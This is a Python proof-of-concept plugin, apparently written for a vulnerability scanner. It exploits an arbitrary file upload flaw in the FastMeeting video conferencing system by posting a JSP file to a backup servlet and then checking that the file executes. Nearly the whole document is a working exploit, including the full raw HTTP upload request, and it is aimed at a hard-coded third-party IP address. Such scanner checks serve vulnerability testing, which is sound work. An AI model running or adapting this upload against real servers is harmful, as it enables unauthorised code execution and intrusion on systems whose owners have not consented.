#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 好视通FastMeeting视频会议系统任意文件上传
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0132866
description:
 缺陷地址:/AdminMgr/backup/databackup.jsp
'''

def assign(service, arg):
    if service == 'fastmeeting':
        return True, arg

def audit(arg):
    upload_url=arg+'dbbackup/servlet/backupServlet?action=sc'
    raw='''POST /dbbackup/servlet/backupServlet?action=sc HTTP/1.1
Host: 221.7.222.164:8080
Content-Length: 285
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://221.7.222.164:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVsQhvGjUy0npvhbo
Referer: http://221.7.222.164:8080/dbbackup/adminMgr/fileupload.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

------WebKitFormBoundaryVsQhvGjUy0npvhbo
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: text/plain

<%@ page import="java.util.*,java.io.*" %>
<%@ page import="java.io.*"%>
<% out.println("testvul");%>
------WebKitFormBoundaryVsQhvGjUy0npvhbo--'''
    code, head, res, err, _ = curl.curl2(upload_url,raw=raw)
    if code==302 and 'info=upsucc' in head:
        verify_url = arg + 'dbbackup/backup/test.jsp'
        code, head, res, err, _ = curl.curl2(verify_url)
        if code==200 and 'testvul' in res:
            security_hole('Arbitrarilly file upload: '+arg+'AdminMgr/backup/databackup.jsp')
if __name__ == '__main__':
    from dummy import *
    audit(assign('fastmeeting', 'http://221.7.222.164:8080/')[1])